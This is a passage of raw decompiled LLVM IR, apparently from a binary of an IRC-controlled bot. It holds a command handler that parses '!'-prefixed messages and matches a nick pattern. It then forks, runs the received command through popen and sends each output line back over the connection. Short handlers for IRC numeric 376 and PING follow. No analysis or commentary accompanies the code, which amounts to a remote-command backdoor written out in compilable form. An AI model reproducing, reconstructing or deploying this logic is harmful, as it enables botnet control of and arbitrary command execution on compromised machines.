  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* @r3, align 4
  %v0_100031b062 = call i32 @__GI_strlen()
  store i32 %v0_100031b062, i32* %r3.global-to-local, align 4
  %v0_100031b863 = load i32, i32* %r29.global-to-local, align 4
  %v2_100031b864 = icmp ult i32 %v0_100031b863, %v0_100031b062
  br i1 %v2_100031b864, label %dec_label_pc_100031c0, label %dec_label_pc_100031e0

dec_label_pc_1000319c:                            ; preds = %dec_label_pc_100031c0
  %v1_100031a0 = add i32 %storemerge967, 1
  store i32 %v1_100031a0, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* @r3, align 4
  %v0_100031b0 = call i32 @__GI_strlen()
  store i32 %v0_100031b0, i32* %r3.global-to-local, align 4
  %v0_100031b8 = load i32, i32* %r29.global-to-local, align 4
  %v2_100031b8 = icmp ult i32 %v0_100031b8, %v0_100031b0
  br i1 %v2_100031b8, label %dec_label_pc_100031c0, label %dec_label_pc_100031e0

dec_label_pc_100031c0:                            ; preds = %dec_label_pc_10003158, %dec_label_pc_1000319c
  %storemerge967 = phi i32 [ %v1_100031a0, %dec_label_pc_1000319c ], [ 0, %dec_label_pc_10003158 ]
  %v2_100031cc = add i32 %storemerge967, %arg2
  %v1_100031d0 = inttoptr i32 %v2_100031cc to i8*
  %v2_100031d0 = load i8, i8* %v1_100031d0, align 1
  %v3_100031d8 = icmp eq i8 %v2_100031d0, 33
  br i1 %v3_100031d8, label %dec_label_pc_100031e0, label %dec_label_pc_1000319c

dec_label_pc_100031e0:                            ; preds = %dec_label_pc_1000319c, %dec_label_pc_100031c0, %dec_label_pc_10003158
  %storemerge9.lcssa = phi i32 [ 0, %dec_label_pc_10003158 ], [ %v1_100031a0, %dec_label_pc_1000319c ], [ %storemerge967, %dec_label_pc_100031c0 ]
  %v2_100031ec = add i32 %storemerge9.lcssa, %arg2
  %v3_100031f4 = inttoptr i32 %v2_100031ec to i8*
  store i8 0, i8* %v3_100031f4, align 1
  %v2_100031fc = load i8, i8* %v5_1000318c, align 1
  %v3_10003204 = icmp eq i8 %v2_100031fc, 33
  br i1 %v3_10003204, label %dec_label_pc_1000320c, label %dec_label_pc_100037bc

dec_label_pc_1000320c:                            ; preds = %dec_label_pc_100031e0
  %v3_10003210 = load i32, i32* @global_var_1002efe8.155, align 4
  store i32 %arg3, i32* @r3, align 4
  store i32 %v3_10003210, i32* @r4, align 4
  %v2_1000321c = call i32 @__GI_strcasecmp(i32 %arg3, i32 %v3_10003210)
  store i32 %v2_1000321c, i32* %r3.global-to-local, align 4
  %v3_10003224 = icmp eq i32 %v2_1000321c, 0
  br i1 %v3_10003224, label %dec_label_pc_1000322c, label %dec_label_pc_100037bc

dec_label_pc_1000322c:                            ; preds = %dec_label_pc_1000320c
  %v2_1000322c = ptrtoint i32* %stack_var_-2096 to i32
  store i32 %v2_1000322c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10003244.156 to i32), i32* @lr, align 4
  %v3_10003240 = call i32 @__GI_memset(i32 %v2_1000322c, i32 0, i32 1024)
  %v1_10003250 = add i32 %v2_10003164, 3
  %v5_10003254 = inttoptr i32 %v1_10003250 to i8*
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10003250, i32* @r3, align 4
  %v0_1000327854 = call i32 @__GI_strlen()
  store i32 %v0_1000327854, i32* %r3.global-to-local, align 4
  %v0_1000328055 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000328056 = icmp ult i32 %v0_1000328055, %v0_1000327854
  br i1 %v2_1000328056, label %dec_label_pc_10003288, label %dec_label_pc_100032a8

dec_label_pc_10003264:                            ; preds = %dec_label_pc_10003288
  %v1_10003268 = add i32 %storemerge1059, 1
  store i32 %v1_10003268, i32* %r29.global-to-local, align 4
  store i32 %v1_10003250, i32* @r3, align 4
  %v0_10003278 = call i32 @__GI_strlen()
  store i32 %v0_10003278, i32* %r3.global-to-local, align 4
  %v0_10003280 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003280 = icmp ult i32 %v0_10003280, %v0_10003278
  br i1 %v2_10003280, label %dec_label_pc_10003288, label %dec_label_pc_100032a8

dec_label_pc_10003288:                            ; preds = %dec_label_pc_1000322c, %dec_label_pc_10003264
  %storemerge1059 = phi i32 [ %v1_10003268, %dec_label_pc_10003264 ], [ 0, %dec_label_pc_1000322c ]
  %v2_10003294 = add i32 %storemerge1059, %v1_10003250
  %v1_10003298 = inttoptr i32 %v2_10003294 to i8*
  %v2_10003298 = load i8, i8* %v1_10003298, align 1
  %v3_100032a0 = icmp eq i8 %v2_10003298, 32
  br i1 %v3_100032a0, label %dec_label_pc_100032a8, label %dec_label_pc_10003264

dec_label_pc_100032a8:                            ; preds = %dec_label_pc_10003264, %dec_label_pc_10003288, %dec_label_pc_1000322c
  %storemerge10.lcssa = phi i32 [ 0, %dec_label_pc_1000322c ], [ %v1_10003268, %dec_label_pc_10003264 ], [ %storemerge1059, %dec_label_pc_10003288 ]
  %v2_100032b4 = add i32 %storemerge10.lcssa, %v1_10003250
  %v3_100032bc = inttoptr i32 %v2_100032b4 to i8*
  store i8 0, i8* %v3_100032bc, align 1
  %v3_100032c4 = load i32, i32* @global_var_1002efd4.157, align 4
  store i32 %v1_10003250, i32* %r3.global-to-local, align 4
  store i32 268448468, i32* @lr, align 4
  %v4_100032d0 = call i32 @strwildmatch(i8* %v5_10003254, i32 %v3_100032c4, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  store i32 %v4_100032d0, i32* %r3.global-to-local, align 4
  %v3_100032d8 = icmp eq i32 %v4_100032d0, 0
  br i1 %v3_100032d8, label %dec_label_pc_100032e0, label %dec_label_pc_100037bc

dec_label_pc_100032e0:                            ; preds = %dec_label_pc_100032a8
  %v1_100032ec = add i32 %v2_100032b4, 1
  %v5_100032f0 = inttoptr i32 %v1_100032ec to i8*
  store i32 %v1_100032ec, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_100187ec.158 to i32), i32* @r4, align 4
  %v6_10003304 = call i32 @__GI_strncmp(i8* %v5_100032f0, i32 ptrtoint ([5 x i8]* @global_var_100187ec.158 to i32), i32 4, i32 268566528)
  store i32 %v6_10003304, i32* %r3.global-to-local, align 4
  %v3_1000330c = icmp eq i32 %v6_10003304, 0
  br i1 %v3_1000330c, label %dec_label_pc_10003314, label %dec_label_pc_10003364

dec_label_pc_10003314:                            ; preds = %dec_label_pc_100032e0
  %v3_10003318 = load i8, i8* @global_var_1002efbc.21, align 1
  %v3_10003320 = icmp eq i8 %v3_10003318, 0
  br i1 %v3_10003320, label %dec_label_pc_10003344, label %dec_label_pc_10003328

dec_label_pc_10003328:                            ; preds = %dec_label_pc_10003314
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_1000333c = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_10017a98.23 to i32), i32 %arg2, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  store i32 %v6_1000333c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003364

dec_label_pc_10003344:                            ; preds = %dec_label_pc_10003314
  %v1_10003348 = add i32 %v2_100032b4, 5
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v5_10003360 = call i32 @Send(i32 %arg1, i32 ptrtoint ([4 x i8]* @global_var_100187f4.160 to i32), i32 %v1_10003348, i32 268566528)
  store i32 %v5_10003360, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003364

dec_label_pc_10003364:                            ; preds = %dec_label_pc_100032e0, %dec_label_pc_10003328, %dec_label_pc_10003344
  store i32 %v1_100032ec, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_100187f8.161 to i32), i32* @r4, align 4
  %v6_10003374 = call i32 @__GI_strncmp(i8* %v5_100032f0, i32 ptrtoint ([4 x i8]* @global_var_100187f8.161 to i32), i32 3, i32 268566528)
  store i32 %v6_10003374, i32* %r3.global-to-local, align 4
  %v3_1000337c = icmp eq i32 %v6_10003374, 0
  br i1 %v3_1000337c, label %dec_label_pc_10003384, label %dec_label_pc_10003464

dec_label_pc_10003384:                            ; preds = %dec_label_pc_10003364
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_10003388 = call i32 @mfork(i32 %arg2)
  store i32 %v1_10003388, i32* %r3.global-to-local, align 4
  %v3_10003390 = icmp eq i32 %v1_10003388, 0
  br i1 %v3_10003390, label %dec_label_pc_10003398, label %dec_label_pc_100037bc

dec_label_pc_10003398:                            ; preds = %dec_label_pc_10003384
  %v2_10003398 = ptrtoint i32* %stack_var_-1072 to i32
  store i32 %v2_10003398, i32* %r3.global-to-local, align 4
  store i32 268448684, i32* @lr, align 4
  %v3_100033a8 = call i32 @__GI_memset(i32 %v2_10003398, i32 0, i32 1024)
  store i32 %v2_10003398, i32* @r3, align 4
  store i32 268448720, i32* @lr, align 4
  %v1_100033cc = call i32 @sprintf(i32 %v2_10003398)
  store i32 %v2_10003398, i32* %r3.global-to-local, align 4
  store i32 268448740, i32* @lr, align 4
  %v5_100033e0 = call i32 @popen(i32 %v2_10003398, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_10017ac8.30, i32 0, i32 0), i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  store i32 %v5_100033e0, i32* %stack_var_-2168, align 4
  store i32 %v5_100033e0, i32* %r3.global-to-local, align 4
  store i32 268448840, i32* @lr, align 4
  %v1_1000344450 = call i32 @feof(i32 %v5_100033e0)
  store i32 %v1_1000344450, i32* %r3.global-to-local, align 4
  %v3_1000344c53 = icmp eq i32 %v1_1000344450, 0
  br i1 %v3_1000344c53, label %dec_label_pc_100033f0, label %dec_label_pc_10003454

dec_label_pc_100033f0:                            ; preds = %dec_label_pc_10003398, %dec_label_pc_100033f0
  store i32 %v2_10003398, i32* %r3.global-to-local, align 4
  store i32 268448772, i32* @lr, align 4
  %v3_10003400 = call i32 @__GI_memset(i32 %v2_10003398, i32 0, i32 1024)
  store i32 %v2_10003398, i32* %r3.global-to-local, align 4
  %v3_10003410 = load i32, i32* %stack_var_-2168, align 4
  store i32 268448792, i32* @lr, align 4
  %v3_10003414 = call i32 @fgets(i32 %v2_10003398, i32 1024, i32 %v3_10003410)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_10003434 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_10018838.163 to i32), i32 %arg2, i32 %v2_10003398)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268448832, i32* @lr, align 4
  %v1_1000343c = call i32 @sleep(i32 1)
  %v3_10003440 = load i32, i32* %stack_var_-2168, align 4
  store i32 %v3_10003440, i32* %r3.global-to-local, align 4
  store i32 268448840, i32* @lr, align 4
  %v1_10003444 = call i32 @feof(i32 %v3_10003440)
  store i32 %v1_10003444, i32* %r3.global-to-local, align 4
  %v3_1000344c = icmp eq i32 %v1_10003444, 0
  br i1 %v3_1000344c, label %dec_label_pc_100033f0, label %dec_label_pc_10003454

dec_label_pc_10003454:                            ; preds = %dec_label_pc_100033f0, %dec_label_pc_10003398
  %v3_10003454 = load i32, i32* %stack_var_-2168, align 4
  store i32 %v3_10003454, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000345c.165 to i32), i32* @lr, align 4
  %v1_10003458 = call i32 @pclose(i32 %v3_10003454)
  %v0_10003460 = call i32 @__GI_exit()
  store i32 %v0_10003460, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003464

dec_label_pc_10003464:                            ; preds = %dec_label_pc_10003364, %dec_label_pc_10003454
  store i32 %v1_100032ec, i32* @r3, align 4
  %v0_10003468 = call i32 @__GI_strlen()
  store i32 %v0_10003468, i32* %r3.global-to-local, align 4
  %v2_100034e441 = icmp sgt i32 %v0_10003468, 0
  br i1 %v2_100034e441, label %dec_label_pc_10003480.lr.ph, label %dec_label_pc_10003530.preheader

dec_label_pc_10003480.lr.ph:                      ; preds = %dec_label_pc_10003464
  %v2_100034b8 = ptrtoint i32* %stack_var_-2168 to i32
  %v2_100034bc = add i32 %v2_100034b8, 72
  br label %dec_label_pc_10003480

dec_label_pc_10003480:                            ; preds = %dec_label_pc_10003480.lr.ph, %dec_label_pc_100034a8
  %storemerge1145 = phi i32 [ 0, %dec_label_pc_10003480.lr.ph ], [ %v1_100034d4, %dec_label_pc_100034a8 ]
  %stack_var_-2156.044 = phi i8* [ %v5_100032f0, %dec_label_pc_10003480.lr.ph ], [ %v5_100034cc, %dec_label_pc_100034a8 ]
  %v4_10003480 = ptrtoint i8* %stack_var_-2156.044 to i32
  %v2_10003484 = load i8, i8* %stack_var_-2156.044, align 1
  %v3_1000348c = icmp eq i8 %v2_10003484, 32
  br i1 %v3_1000348c, label %dec_label_pc_10003530.preheader, label %dec_label_pc_10003494

dec_label_pc_10003494:                            ; preds = %dec_label_pc_10003480
  %v2_10003498 = load i8, i8* %stack_var_-2156.044, align 1
  %v3_100034a0 = icmp eq i8 %v2_10003498, 0
  br i1 %v3_100034a0, label %dec_label_pc_10003530.preheader, label %dec_label_pc_100034a8

dec_label_pc_100034a8:                            ; preds = %dec_label_pc_10003494
  %v2_100034b0 = load i8, i8* %stack_var_-2156.044, align 1
  %v3_100034c0 = add i32 %v2_100034bc, %storemerge1145
  %v4_100034c0 = inttoptr i32 %v3_100034c0 to i8*
  store i8 %v2_100034b0, i8* %v4_100034c0, align 1
  %v1_100034c8 = add i32 %v4_10003480, 1
  %v5_100034cc = inttoptr i32 %v1_100034c8 to i8*
  %v1_100034d4 = add nuw nsw i32 %storemerge1145, 1
  %v2_100034e4 = icmp slt i32 %v1_100034d4, %v0_10003468
  br i1 %v2_100034e4, label %dec_label_pc_10003480, label %dec_label_pc_10003530.preheader

dec_label_pc_10003530.preheader:                  ; preds = %dec_label_pc_100034a8, %dec_label_pc_10003480, %dec_label_pc_10003494, %dec_label_pc_10003464
  %stack_var_-2156.0.lcssa = phi i8* [ %v5_100032f0, %dec_label_pc_10003464 ], [ %v5_100034cc, %dec_label_pc_100034a8 ], [ %stack_var_-2156.044, %dec_label_pc_10003480 ], [ %stack_var_-2156.044, %dec_label_pc_10003494 ]
  store i32 0, i32* %r29.global-to-local, align 4
  %v4_10003534 = ptrtoint i8* %stack_var_-2156.0.lcssa to i32
  store i32 %v4_10003534, i32* @r3, align 4
  %v0_1000353833 = call i32 @__GI_strlen()
  store i32 %v0_1000353833, i32* %r3.global-to-local, align 4
  %v0_1000354034 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000354035 = icmp ult i32 %v0_1000354034, %v0_1000353833
  br i1 %v2_1000354035, label %dec_label_pc_100034f8, label %dec_label_pc_10003548

dec_label_pc_100034f8:                            ; preds = %dec_label_pc_10003530.preheader, %dec_label_pc_10003524
  %storemerge1239 = phi i32 [ %v1_10003528, %dec_label_pc_10003524 ], [ 0, %dec_label_pc_10003530.preheader ]
  %stack_var_-2160.138 = phi i32 [ %stack_var_-2160.0, %dec_label_pc_10003524 ], [ 0, %dec_label_pc_10003530.preheader ]
  %v2_10003504 = add i32 %storemerge1239, %v4_10003534
  %v1_10003508 = inttoptr i32 %v2_10003504 to i8*
  %v2_10003508 = load i8, i8* %v1_10003508, align 1
  %v3_10003510 = icmp eq i8 %v2_10003508, 32
  br i1 %v3_10003510, label %dec_label_pc_10003518, label %dec_label_pc_10003524

dec_label_pc_10003518:                            ; preds = %dec_label_pc_100034f8
  %v1_1000351c = add i32 %stack_var_-2160.138, 1
  br label %dec_label_pc_10003524

dec_label_pc_10003524:                            ; preds = %dec_label_pc_100034f8, %dec_label_pc_10003518
  %stack_var_-2160.0 = phi i32 [ %v1_1000351c, %dec_label_pc_10003518 ], [ %stack_var_-2160.138, %dec_label_pc_100034f8 ]
  %v1_10003528 = add i32 %storemerge1239, 1
  store i32 %v1_10003528, i32* %r29.global-to-local, align 4
  store i32 %v4_10003534, i32* @r3, align 4
  %v0_10003538 = call i32 @__GI_strlen()
  store i32 %v0_10003538, i32* %r3.global-to-local, align 4
  %v0_10003540 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003540 = icmp ult i32 %v0_10003540, %v0_10003538
  br i1 %v2_10003540, label %dec_label_pc_100034f8, label %dec_label_pc_10003548

dec_label_pc_10003548:                            ; preds = %dec_label_pc_10003524, %dec_label_pc_10003530.preheader
  %stack_var_-2160.1.lcssa = phi i32 [ 0, %dec_label_pc_10003530.preheader ], [ %stack_var_-2160.0, %dec_label_pc_10003524 ]
  %v1_1000354c = add i32 %stack_var_-2160.1.lcssa, 1
  %tmp100 = icmp slt i32 %v1_1000354c, 11
  br i1 %tmp100, label %dec_label_pc_10003568, label %dec_label_pc_10003560

dec_label_pc_10003560:                            ; preds = %dec_label_pc_10003548
  br label %dec_label_pc_10003568

dec_label_pc_10003568:                            ; preds = %dec_label_pc_10003548, %dec_label_pc_10003560
  %stack_var_-2160.2 = phi i32 [ %v1_1000354c, %dec_label_pc_10003548 ], [ 10, %dec_label_pc_10003560 ]
  %v1_10003574 = mul i32 %stack_var_-2160.2, 4
  %v2_1000357c = ptrtoint i32* %stack_var_-2168 to i32
  %v2_10003580 = add i32 %v2_1000357c, 28
  %v1_10003584 = add i32 %v2_10003580, %v1_10003574
  %v2_10003590 = inttoptr i32 %v1_10003584 to i32*
  store i32 ptrtoint (i32* @global_var_10018848.166 to i32), i32* %v2_10003590, align 4
  %v2_100036b427 = load i8, i8* %stack_var_-2156.0.lcssa, align 1
  %v3_100036bc30 = icmp eq i8 %v2_100036b427, 0
  br i1 %v3_100036bc30, label %dec_label_pc_100036c4, label %dec_label_pc_100035a0.lr.ph

dec_label_pc_100035a0.lr.ph:                      ; preds = %dec_label_pc_10003568
  %v2_10003630 = add i32 %v2_1000357c, 24
  br label %dec_label_pc_100035a0

dec_label_pc_100035a0:                            ; preds = %dec_label_pc_100035a0.lr.ph, %dec_label_pc_1000360c
  %v4_100036b032 = phi i32 [ %v4_10003534, %dec_label_pc_100035a0.lr.ph ], [ %v2_100036a8, %dec_label_pc_1000360c ]
  %stack_var_-2164.031 = phi i32 [ 1, %dec_label_pc_100035a0.lr.ph ], [ %v1_10003694, %dec_label_pc_1000360c ]
  %v1_100035a4 = add i32 %v4_100036b032, 1
  %v2_100035b4 = icmp slt i32 %stack_var_-2164.031, %stack_var_-2160.2
  br i1 %v2_100035b4, label %dec_label_pc_100035d4.preheader, label %dec_label_pc_100036c4

dec_label_pc_100035d4.preheader:                  ; preds = %dec_label_pc_100035a0
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_100035a4, i32* @r3, align 4
  %v0_100035dc19 = call i32 @__GI_strlen()
  store i32 %v0_100035dc19, i32* %r3.global-to-local, align 4
  %v0_100035e420 = load i32, i32* %r29.global-to-local, align 4
  %v2_100035e421 = icmp ult i32 %v0_100035e420, %v0_100035dc19
  br i1 %v2_100035e421, label %dec_label_pc_100035ec, label %dec_label_pc_1000360c

dec_label_pc_100035c8:                            ; preds = %dec_label_pc_100035ec
  %v1_100035cc = add i32 %storemerge1424, 1
  store i32 %v1_100035cc, i32* %r29.global-to-local, align 4
  store i32 %v1_100035a4, i32* @r3, align 4
  %v0_100035dc = call i32 @__GI_strlen()
  store i32 %v0_100035dc, i32* %r3.global-to-local, align 4
  %v0_100035e4 = load i32, i32* %r29.global-to-local, align 4
  %v2_100035e4 = icmp ult i32 %v0_100035e4, %v0_100035dc
  br i1 %v2_100035e4, label %dec_label_pc_100035ec, label %dec_label_pc_1000360c

dec_label_pc_100035ec:                            ; preds = %dec_label_pc_100035d4.preheader, %dec_label_pc_100035c8
  %storemerge1424 = phi i32 [ %v1_100035cc, %dec_label_pc_100035c8 ], [ 0, %dec_label_pc_100035d4.preheader ]
  %v2_100035f8 = add i32 %storemerge1424, %v1_100035a4
  %v1_100035fc = inttoptr i32 %v2_100035f8 to i8*
  %v2_100035fc = load i8, i8* %v1_100035fc, align 1
  %v3_10003604 = icmp eq i8 %v2_100035fc, 32
  br i1 %v3_10003604, label %dec_label_pc_1000360c, label %dec_label_pc_100035c8

dec_label_pc_1000360c:                            ; preds = %dec_label_pc_100035c8, %dec_label_pc_100035ec, %dec_label_pc_100035d4.preheader
  %storemerge14.lcssa = phi i32 [ 0, %dec_label_pc_100035d4.preheader ], [ %v1_100035cc, %dec_label_pc_100035c8 ], [ %storemerge1424, %dec_label_pc_100035ec ]
  store i32 %stack_var_-2164.031, i32* @r29, align 4
  %v1_10003614 = add i32 %storemerge14.lcssa, 1
  store i32 %v1_10003614, i32* @r3, align 4
  store i32 268449312, i32* @lr, align 4
  %v0_1000361c = call i32 @malloc()
  store i32 %v0_1000361c, i32* %r3.global-to-local, align 4
  %v0_10003628 = load i32, i32* @r29, align 4
  %v1_10003628 = mul i32 %v0_10003628, 4
  %v1_10003634 = add i32 %v1_10003628, %v2_10003630
  %v2_10003638 = inttoptr i32 %v1_10003634 to i32*
  store i32 %v0_1000361c, i32* %v2_10003638, align 4
  %v1_10003640 = mul i32 %stack_var_-2164.031, 4
  %v1_1000364c = add i32 %v1_10003640, %v2_10003630
  %v1_10003650 = inttoptr i32 %v1_1000364c to i32*
  %v2_10003650 = load i32, i32* %v1_10003650, align 4
  store i32 %v2_10003650, i32* %r3.global-to-local, align 4
  store i32 %v1_100035a4, i32* @r4, align 4
  store i32 268449384, i32* @lr, align 4
  %v3_10003664 = call i32 @strncpy(i32 %v2_10003650, i32 %v1_100035a4, i32 %storemerge14.lcssa)
  store i32 %v3_10003664, i32* %r3.global-to-local, align 4
  %v2_1000367c = load i32, i32* %v1_10003650, align 4
  %v2_10003684 = add i32 %v2_1000367c, %storemerge14.lcssa
  %v3_1000368c = inttoptr i32 %v2_10003684 to i8*
  store i8 0, i8* %v3_1000368c, align 1
  %v1_10003694 = add nuw i32 %stack_var_-2164.031, 1
  %v2_100036a8 = add i32 %storemerge14.lcssa, %v1_100035a4
  %v5_100036ac = inttoptr i32 %v2_100036a8 to i8*
  %v2_100036b4 = load i8, i8* %v5_100036ac, align 1
  %v3_100036bc = icmp eq i8 %v2_100036b4, 0
  br i1 %v3_100036bc, label %dec_label_pc_100036c4, label %dec_label_pc_100035a0

dec_label_pc_100036c4:                            ; preds = %dec_label_pc_1000360c, %dec_label_pc_100035a0, %dec_label_pc_10003568
  %v2_100037b0 = load i32, i32* bitcast ([8 x i8]** @global_var_1002a68c.168 to i32*), align 4
  %v3_100037b4 = icmp eq i32 %v2_100037b0, 0
  br i1 %v3_100037b4, label %dec_label_pc_100037bc, label %dec_label_pc_100036d0

dec_label_pc_100036d0:                            ; preds = %dec_label_pc_100036c4
  store i32 %v2_100037b0, i32* @r3, align 4
  store i32 %v2_1000322c, i32* @r4, align 4
  %v2_100036f4 = call i32 @__GI_strcasecmp(i32 %v2_100037b0, i32 %v2_1000322c)
  store i32 %v2_100036f4, i32* %r3.global-to-local, align 4
  %v2_1000371c = load i32, i32* inttoptr (i32 add (i32 ptrtoint ([8 x i8]** @global_var_1002a68c.168 to i32), i32 4) to i32*), align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  call void @__pseudo_call(i32 %v2_1000371c)
  %v2_1000378415 = icmp sgt i32 %stack_var_-2160.2, 1
  br i1 %v2_1000378415, label %dec_label_pc_10003750.lr.ph, label %dec_label_pc_100037bc

dec_label_pc_10003750.lr.ph:                      ; preds = %dec_label_pc_100036d0
  %v2_1000375c = add i32 %v2_1000357c, 24
  br label %dec_label_pc_10003750

dec_label_pc_10003750:                            ; preds = %dec_label_pc_10003750.lr.ph, %dec_label_pc_10003750
  %storemerge1318 = phi i32 [ 1, %dec_label_pc_10003750.lr.ph ], [ %v1_10003774, %dec_label_pc_10003750 ]
  %v1_10003754 = mul i32 %storemerge1318, 4
  %v1_10003760 = add i32 %v2_1000375c, %v1_10003754
  %v1_10003764 = inttoptr i32 %v1_10003760 to i32*
  %v2_10003764 = load i32, i32* %v1_10003764, align 4
  store i32 %v2_10003764, i32* @r3, align 4
  store i32 268449648, i32* @lr, align 4
  %v0_1000376c = call i32 @free()
  store i32 %v0_1000376c, i32* %r3.global-to-local, align 4
  %v1_10003774 = add nuw nsw i32 %storemerge1318, 1
  %v2_10003784 = icmp slt i32 %v1_10003774, %stack_var_-2160.2
  br i1 %v2_10003784, label %dec_label_pc_10003750, label %dec_label_pc_100037bc

dec_label_pc_100037bc:                            ; preds = %dec_label_pc_10003750, %dec_label_pc_100036d0, %dec_label_pc_100036c4, %dec_label_pc_10003384, %dec_label_pc_100032a8, %dec_label_pc_1000320c, %dec_label_pc_100031e0
  %v2_100037bc = load i32, i32* %stack_var_-2176, align 4
  %v1_100037c8 = add i32 %v2_100037bc, -12
  %v2_100037c8 = inttoptr i32 %v1_100037c8 to i32*
  %v3_100037c8 = load i32, i32* %v2_100037c8, align 4
  store i32 %v3_100037c8, i32* %r29.global-to-local, align 4
  %v0_100037d4 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100037d4

; uselistorder directives
  uselistorder i32 %storemerge1318, { 1, 0 }
  uselistorder i32 %v2_100037b0, { 1, 0, 2 }
  uselistorder i32 %v2_100036a8, { 1, 0 }
  uselistorder i32 %storemerge14.lcssa, { 0, 1, 3, 2 }
  uselistorder i32 %v1_100035a4, { 0, 3, 4, 1, 5, 2 }
  uselistorder i32 %stack_var_-2164.031, { 3, 0, 2, 1 }
  uselistorder i32 %v2_1000357c, { 2, 1, 0 }
  uselistorder i32 %stack_var_-2160.2, { 3, 1, 2, 0 }
  uselistorder i32 %v1_10003528, { 1, 0 }
  uselistorder i32 %stack_var_-2160.138, { 1, 0 }
  uselistorder i32 %storemerge1239, { 1, 0 }
  uselistorder i32 %v4_10003534, { 1, 3, 0, 2 }
  uselistorder i8* %stack_var_-2156.044, { 0, 1, 5, 4, 2, 3 }
  uselistorder i32 %storemerge1145, { 1, 0 }
  uselistorder i32 %v0_10003468, { 1, 0, 2 }
  uselistorder i32 %v5_100033e0, { 1, 0, 2 }
  uselistorder i32 %v2_10003398, { 1, 3, 2, 5, 4, 7, 6, 0, 8, 10, 9 }
  uselistorder i32 %v2_100032b4, { 1, 0, 2 }
  uselistorder i32 %v1_10003250, { 3, 0, 1, 4, 2, 5 }
  uselistorder i32 %v2_1000322c, { 1, 0, 3, 2 }
  uselistorder i32 %v2_10003164, { 1, 0, 2 }
  uselistorder i32* %stack_var_-2168, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 43, 9, 10, 6, 11, 12, 36, 13, 38, 7, 2, 14, 8, 15, 41, 20, 16, 17, 18, 19, 4, 3, 21, 22, 44, 23, 24, 25, 42, 26, 27, 28, 1, 29, 30, 31, 40, 5, 32, 37, 33, 34, 39, 35, 0 }
  uselistorder i32* %r29.global-to-local, { 6, 7, 8, 19, 20, 9, 10, 0, 1, 11, 12, 2, 3, 13, 14, 4, 5, 15, 16, 17, 18 }
  uselistorder i32 (i32)* @feof, { 1, 0 }
  uselistorder i32 268448840, { 1, 0 }
  uselistorder [2 x i8]* @global_var_10017ac8.30, { 1, 0 }
  uselistorder i32 (i32)* @mfork, { 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 ptrtoint ([30 x i8]* @global_var_10017a98.23 to i32), { 0, 2, 1 }
  uselistorder i8* @global_var_1002efbc.21, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg3, { 4, 3, 0, 1, 5, 2 }
  uselistorder i32 %arg2, { 4, 6, 5, 3, 0, 1, 7, 2 }
  uselistorder i32 %arg1, { 2, 4, 3, 6, 5, 1, 0, 7 }
  uselistorder label %dec_label_pc_10003750, { 1, 0 }
  uselistorder label %dec_label_pc_1000360c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100035ec, { 1, 0 }
  uselistorder label %dec_label_pc_100035a0, { 1, 0 }
  uselistorder label %dec_label_pc_10003568, { 1, 0 }
  uselistorder label %dec_label_pc_10003524, { 1, 0 }
  uselistorder label %dec_label_pc_100034f8, { 1, 0 }
  uselistorder label %dec_label_pc_10003530.preheader, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10003480, { 1, 0 }
  uselistorder label %dec_label_pc_10003464, { 1, 0 }
  uselistorder label %dec_label_pc_100033f0, { 1, 0 }
  uselistorder label %dec_label_pc_10003364, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100032a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003288, { 1, 0 }
  uselistorder label %dec_label_pc_100031e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100031c0, { 1, 0 }
  uselistorder label %dec_label_pc_10003158, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003138, { 1, 0 }
}

define i32 @_376(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_100037fc = load i32, i32* @global_var_1002efd4.157, align 4
  %v5_10003814 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_1001884c.170 to i32), i32 %v3_100037fc, i32 268566528)
  %v3_1000381c = load i32, i32* @global_var_1002efe8.155, align 4
  %v3_10003824 = load i32, i32* @global_var_1002efe4.171, align 4
  %v6_10003840 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_1001885c.172 to i32), i32 %v3_1000381c, i32 %v3_10003824)
  %v3_10003848 = load i32, i32* @global_var_1002efd4.157, align 4
  %v5_10003860 = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_1001886c.173 to i32), i32 %v3_10003848, i32 268566528)
  ret i32 %v5_10003860
}

define i32 @_PING(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
